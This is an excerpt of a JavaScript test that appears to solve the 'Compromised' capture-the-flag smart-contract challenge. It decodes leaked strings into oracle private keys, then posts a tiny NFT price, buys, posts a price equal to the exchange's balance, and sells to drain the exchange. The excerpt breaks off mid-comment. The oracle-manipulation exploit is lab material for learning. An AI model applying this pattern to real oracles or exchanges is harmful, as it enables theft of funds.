...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    // smart contract programmer code
    const leakToPK = (leak) => {
      const base64 = Buffer.from(leak.split(` `).join(``), `hex`).toString(
        `utf-8`
      );
      const hexKey = Buffer.from(base64, `base64`).toString("utf-8");
      console.log(`pk from base64 ${hexKey}`);
      return hexKey;
    };
    ...
    console.log(
      `Compromised oracles: ${CompromisedOracles.map((acc) => acc.address).join(
        ` `
      )}`
    );

    // rest of the code is by johny time
    ...
    // console.log(
    //   `signer1 and signer2 ${signer1.address} and ${signer2.address}`
    // );

    const buyPrice = ethers.utils.parseEther("0.000000000000000001");
    ...
    // reduce price and buy nft
    await oracle.connect(oracle1).postPrice("DVNFT", buyPrice);
    await oracle.connect(oracle2).postPrice("DVNFT", buyPrice);
    const tx = await exchange.connect(player).buyOne({ value: buyPrice });

    const exchange_balance = ethers.utils.parseEther("999.000000000000000001");
    // increase price and sell nft
    await oracle.connect(oracle1).postPrice("DVNFT", exchange_balance);
    await oracle.connect(oracle2).postPrice("DVNFT", exchange_balance);
    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);

    // remobe trails and change to original price
